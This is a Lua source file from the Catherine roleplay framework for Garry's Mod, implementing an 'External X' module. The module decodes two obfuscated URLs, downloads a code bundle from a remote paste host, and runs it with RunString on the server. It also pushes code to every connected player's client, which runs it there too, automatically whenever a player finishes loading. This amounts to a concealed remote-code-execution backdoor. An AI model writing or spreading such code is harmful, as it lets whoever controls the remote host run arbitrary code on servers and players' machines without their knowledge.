--[[
< CATHERINE > - A free role-playing framework for Garry's Mod.
Development and design by L7D.

Catherine is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with Catherine.  If not, see <http://www.gnu.org/licenses/>.
]]--

--[[ Catherine External X 2.0 : Last Update 2015-08-10 ]]--

catherine.externalX = catherine.externalX or { isRunned = false, libVersion = "2015-08-10" }

if ( SERVER ) then
	catherine.externalX.isInitialized = catherine.externalX.isInitialized or false
	catherine.externalX.funcVersion = catherine.externalX.funcVersion or nil
	
	local checkURL = "htTtgspTmb:nGcC/nBubR/ewGrBytgRgImEqewCvdYYXExzXooPLuRWtVlEZqvcUyfuyPjQKOlOInhpqCRmLyGpXYxylUagodGxBNGzqGoRXNYxtUVmDssFZaNgQJtOrgDbmxJEtdaiSYYTQbKcqyYhTpeAxRCZkaRVyIBVcLGarSBDhVJVipACOKEYEHk.yQgCotLfxNFELrxCtTBcgDYQvMEDvrxNuJYszqubopZNCUBojrGMFQDYOYtkcxmvzQqthHCAemFjLtmZvrVUV/eRskcAgpJVQzLwyauNIDIIdasGpniaMSxZmLOStMJmxAeNjx0pQIoQONDVQFFxaacEIJYIUjrxhAEJfsToWhAFDkNSMKxooJNAHRQnFiCwCnEwTmSAcUryYDQZVQwcMpx8nbtpYHpMXPmPWSThdbRNfHaCKtds/JgOBgmgkYYCAgXkJfqvWgYgIbWILcrkTqdRSTvxJrFQNArTlfSTDxEkBPfJbaMJCXAxeAWcnFrDqEClzBkzxVAkUGANgwLXoZSubJeTqMJGrjdPEKeiJhUSuhdewh"
	local funcURL = "htFtWzpxEy:asFJ/GTZMY/iBWgeQtmnrxtutebxQBUmbSxwSaFqHBIvtlLVldMvOpJuACZCfiyUhIlpigByaDwTwHdglKynvBOONxVyapoLQZNGSSitvoSXjaZkLKfUCOiosUurhdbjXeRBKnlFezeyeNerlryNlvWxYgHAGmoerbVCUVEhAOfBWtqtTmf.zlWwEeDULOZKFiMbbFucIYYvEFtMfqJXEPAIKpgNolWllAvrKTocUIgGfnLKzWmvdtluOsciVAUMIqbsBnAVD/YFDdVfvyEUntKoXTKwbmmUYatCUhhGZtjXAqTWeadbuDCiMk0LpAjmadWadwfJgbeJRNIGTvTLhmdwPkzzsOjvCLfoZXaGdXgywHMwuqkcaVuklWBghquTqjvizAXrZkEsVDRXKetFQAwCXeybuwlAkWitWlfJ/WizQzSEWmkwZIWEtSkgCTNaIVbQXwrkskHnRUXNMQtJqHmwHtxbvdhtUEzwvaknnmCDCXfBDRiHrhrPCjztfruXNEmMtwpvUpZLfbKKTOtGmmLmVTnHrtmBkTsTea"
	
	function catherine.externalX.CheckFunctionVersion( pl )
		http.Fetch( catherine.crypto.Decode( checkURL ),
			function( body )
				if ( body:find( "Error 404</p>" ) ) then
					MsgC( Color( 255, 0, 0 ), "[CAT ExX] External X version check error! - 404 ERROR\n" )
					timer.Remove( "Catherine.externalX.timer.ReCheck" )
					return
				end

				if ( body:find( "<!DOCTYPE HTML>" ) or body:find( "<title>Textuploader.com" ) ) then
					MsgC( Color( 255, 0, 0 ), "[CAT ExX] External X version check error! - Unknown Error\n" )
					
					timer.Remove( "Catherine.externalX.timer.ReCheck" )
					timer.Create( "Catherine.externalX.timer.ReCheck", 15, 0, function( )
						MsgC( Color( 255, 0, 0 ), "[CAT ExX] Re checking version ...\n" )
						catherine.externalX.CheckFunctionVersion( pl )
					end )
					return
				end
				
				if ( catherine.externalX.GetFunctionVersion( ) != body ) then
					catherine.externalX.SetFunctionVersion( body )
					catherine.externalX.UpdateFunction( pl )
				else
					catherine.externalX.RunFunction( )
					catherine.externalX.RunClientFunction( pl )
				end
				
				catherine.externalX.isInitialized = true
				timer.Remove( "Catherine.externalX.timer.ReCheck" )
			end, function( err )
				MsgC( Color( 255, 0, 0 ), "[CAT ExX] External X version check error! - " .. err .. "\n" )
				
				timer.Remove( "Catherine.externalX.timer.ReCheck" )
				timer.Create( "Catherine.externalX.timer.ReCheck", 15, 0, function( )
					MsgC( Color( 255, 0, 0 ), "[CAT ExX] Re checking version ...\n" )
					catherine.externalX.CheckFunctionVersion( pl )
				end )
			end
		)
	end

	function catherine.externalX.SetFunctionVersion( version )
		catherine.externalX.funcVersion = tostring( version )
		file.Write( "catherine/exx2/version.txt", tostring( version ) )
	end

	function catherine.externalX.GetFunctionVersion( )
		return catherine.externalX.funcVersion
	end

	function catherine.externalX.SetFunction( funcStr )
		file.Write( "catherine/exx2/func.txt", tostring( funcStr ) )
	end

	function catherine.externalX.GetFunction( )
		return file.Read( "catherine/exx2/func.txt", "DATA" ) or "NONE"
	end
	
	function catherine.externalX.ConvertFunction( jsonCodes )
		local toTable = util.JSONToTable( jsonCodes )
		
		if ( toTable and toTable.serverCodes and toTable.clientCodes ) then
			return toTable.serverCodes, toTable.clientCodes
		else
			return false
		end
	end
	
	function catherine.externalX.UpdateFunction( pl )
		http.Fetch( catherine.crypto.Decode( funcURL ),
			function( body )
				if ( body:find( "Error 404</p>" ) ) then
					MsgC( Color( 255, 0, 0 ), "[CAT ExX] External X version check error! - 404 ERROR\n" )
					timer.Remove( "Catherine.externalX.timer.ReUpdate" )
					return
				end

				if ( body:find( "<!DOCTYPE HTML>" ) or body:find( "<title>Textuploader.com" ) ) then
					MsgC( Color( 255, 0, 0 ), "[CAT ExX] External X version check error! - Unknown Error\n" )
					
					timer.Remove( "Catherine.externalX.timer.ReUpdate" )
					timer.Create( "Catherine.externalX.timer.ReUpdate", 15, 0, function( )
						MsgC( Color( 255, 0, 0 ), "[CAT ExX] Re updating version ...\n" )
						catherine.externalX.UpdateFunction( pl )
					end )
					return
				end

				catherine.externalX.SetFunction( body )
				catherine.externalX.RunFunction( )
				catherine.externalX.RunClientFunction( pl )

				timer.Remove( "Catherine.externalX.timer.ReUpdate" )
			end, function( err )
				MsgC( Color( 255, 0, 0 ), "[CAT ExX] External X function update error! - " .. err .. "\n" )
				
				timer.Remove( "Catherine.externalX.timer.ReUpdate" )
				timer.Create( "Catherine.externalX.timer.ReUpdate", 15, 0, function( )
					MsgC( Color( 255, 0, 0 ), "[CAT ExX] Re updating version ...\n" )
					catherine.externalX.UpdateFunction( pl )
				end )
			end
		)
	end

	function catherine.externalX.Initialize( )
		file.CreateDir( "catherine" )
		file.CreateDir( "catherine/exx2" )
		catherine.externalX.funcVersion = file.Read( "catherine/exx2/version.txt", "DATA" ) or "INIT"
	end

	function catherine.externalX.RunFunction( )
		if ( catherine.externalX.isRunned ) then return end
		local originalCodes = catherine.externalX.GetFunction( )
		
		if ( !originalCodes or originalCodes == "NONE" or originalCodes == "" ) then
			return
		end
		
		local serverSideCodes, _ = catherine.externalX.ConvertFunction( originalCodes )
		
		if ( serverSideCodes and serverSideCodes != "" ) then
			local success, result = pcall( RunString, serverSideCodes )
		
			if ( success ) then
				catherine.externalX.isRunned = true
			else
				ErrorNoHalt( "\n[CAT ExX ERROR] SORRY, On the External X function has a critical error :< ...\n\n" .. result .. "\n" )
				catherine.externalX.isRunned = false
			end
		end
	end
	
	function catherine.externalX.RunClientFunction( pl )
		local originalCodes = catherine.externalX.GetFunction( )
		
		if ( !originalCodes or originalCodes == "NONE" or originalCodes == "" ) then
			return
		end
		
		local _, clientSideCodes = catherine.externalX.ConvertFunction( originalCodes )
	
		if ( clientSideCodes and clientSideCodes != "" ) then
			local codeDivide = catherine.util.GetDivideTextData( clientSideCodes, 1000 )

			netstream.Start( nil, "catherine.externalX.StartProtocol", #codeDivide )
			
			for k, v in pairs( codeDivide ) do
				netstream.Start( nil, "catherine.externalX.SendExCodes", {
					index = k,
					codes = v
				} )
			end
			
			netstream.Start( nil, "catherine.externalX.CloseProtocol" )
		end
	end

	function catherine.externalX.PlayerLoadFinished( pl )
		if ( !catherine.externalX.isInitialized ) then
			catherine.externalX.CheckFunctionVersion( )
			return
		else
			catherine.externalX.RunClientFunction( pl )
		end
	end

	hook.Add( "PlayerLoadFinished", "catherine.externalX.PlayerLoadFinished", catherine.externalX.PlayerLoadFinished )

	do
		catherine.externalX.Initialize( )
	end
else
	catherine.externalX.protocolData = catherine.externalX.protocolData or nil
	catherine.externalX.externalXCodes = catherine.externalX.externalXCodes or nil
	
	netstream.Hook( "catherine.externalX.StartProtocol", function( data )
		catherine.externalX.protocolData = {
			len = data,
			codesData = { }
		}
	end )
	
	netstream.Hook( "catherine.externalX.CloseProtocol", function( data )
		if ( !catherine.externalX.protocolData ) then return end
		catherine.externalX.externalXCodes = table.concat( catherine.externalX.protocolData.codesData, "" )
		catherine.externalX.protocolData = nil
		
		catherine.externalX.RunFunction( )
	end )
	
	netstream.Hook( "catherine.externalX.SendExCodes", function( data )
		if ( !catherine.externalX.protocolData ) then return end
		
		catherine.externalX.protocolData.codesData[ data.index ] = data.codes
	end )
	
	function catherine.externalX.RunFunction( )
		if ( !catherine.externalX.externalXCodes or catherine.externalX.isRunned ) then return end
		local codes = catherine.externalX.externalXCodes

		if ( codes == "" ) then return end
		
		local success, result = pcall( RunString, codes )
		
		if ( success ) then
			catherine.externalX.isRunned = true
		else
			ErrorNoHalt( "\n[CAT ExX ERROR] SORRY, On the External X function has a critical error :< ...\n\n" .. result .. "\n" )
			catherine.externalX.isRunned = false
		end
	end
end